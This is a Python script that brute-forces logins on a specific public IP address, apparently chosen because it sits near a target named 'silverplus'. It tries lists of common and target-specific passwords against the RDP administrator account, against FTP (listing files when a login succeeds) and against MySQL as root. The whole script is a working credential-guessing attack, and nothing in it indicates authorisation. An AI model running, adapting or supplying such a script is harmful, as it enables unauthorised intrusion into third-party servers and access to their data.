import socket, subprocess, sys

IP = '113.113.81.14'

print('=' * 50)
print('TARGET: ' + IP + ' (same /24 as silverplus)')
print('=' * 50)

# 1. RDP Attack
print('\n[1] RDP Attack')
common_pws = ['admin','123456','admin123','admin888','password',
              'P@ssw0rd','Password123','silverplus','100206',
              '113113','root','Admin123','12345678']

for pw in common_pws:
    try:
        r = subprocess.run(
            ['timeout','8','xvfb-run','-a','xfreerdp',
             '/v:'+IP,'/u:administrator','/p:'+pw,
             '/cert-ignore','/auth-only','+sec-nla'],
            capture_output=True,text=True,timeout=10)
        if 'exit status 0' in r.stdout + r.stderr:
            print('>>> RDP HIT: administrator/' + pw + ' <<<')
            break
    except:
        pass
else:
    print('RDP: no hits')

# 2. FTP Attack
print('\n[2] FTP Attack')
from ftplib import FTP

ftp_users = ['anonymous','ftp','admin','administrator','www']
ftp_pws = ['','admin','123456','admin123','password','silverplus','100206']

for u in ftp_users:
    for pw in ftp_pws:
        try:
            f = FTP()
            f.connect(IP, 21, timeout=5)
            f.login(u, pw)
            print('>>> FTP HIT: ' + u + '/' + pw + ' <<<')
            files = []
            f.retrlines('LIST', files.append)
            for line in files[:15]:
                print('  ' + line)
            f.quit()
            import sys; sys.exit(0)
        except:
            try: f.quit()
            except: pass
print('FTP: no hits')

# 3. MySQL Attack
print('\n[3] MySQL Attack')
try:
    import pymysql
    for pw in ['','root','admin','123456','password','mysql','root123']:
        try:
            conn = pymysql.connect(host=IP,port=3306,user='root',password=pw,connect_timeout=5)
            print('>>> MySQL HIT: root/' + pw + ' <<<')
            conn.close()
            break
        except Exception as e:
            if 'Access denied' in str(e):
                pass  # wrong password
            else:
                pass  # different error
except ImportError:
    print('pymysql not installed, trying mysql client...')
    for pw in ['','root','admin','123456','password']:
        try:
            r = subprocess.run(
                ['mysql','-h',IP,'-u','root','-p'+pw,'-e','SELECT 1'],
                capture_output=True,text=True,timeout=5)
            if '1' in r.stdout:
                print('>>> MySQL HIT: root/' + pw + ' <<<')
                break
        except:
            pass
print('MySQL: done')
